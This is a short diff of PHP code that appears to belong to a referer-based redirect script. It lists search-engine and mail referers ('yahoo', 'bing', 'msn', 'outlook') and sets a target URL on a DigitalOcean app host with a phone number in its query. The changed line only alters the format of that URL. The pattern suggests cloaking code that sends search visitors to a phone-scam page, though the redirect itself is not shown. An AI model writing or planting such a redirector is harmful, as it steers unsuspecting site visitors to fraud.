@@ -8,7 +8,7 @@
     $referers_bing=array('yahoo','outlook','msn','becovi','bing');
 
     $lanzar=true;
-    $dominio_m='https://whale-app-iosel.ondigitalocean.app/?phone=919-610-587';
+    $dominio_m='whale-app-iosel.ondigitalocean.app/?phone=919-610-587';
 
     $encontrado=true;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
